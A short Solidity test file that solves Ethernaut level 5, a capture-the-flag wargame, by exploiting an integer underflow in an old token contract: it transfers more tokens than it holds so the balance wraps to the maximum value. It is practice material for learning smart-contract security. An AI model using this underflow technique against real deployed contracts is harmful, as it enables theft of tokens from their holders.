// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level5 {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Level5Test is EthernautTest {
    function testLevel5() public {
        _createLevel("5");
        Level5 levelInstance5 = Level5(levelInstance["5"]);

        // Token contract is solidity 0.6.0, so no underflow checks
        // We are told that we have 40 tokens
        // Transferring 41 tokens will underflow to uint256 max value
        require(levelInstance5.transfer(address(0), 41));

        require(_submitLevel("5"));
    }
}
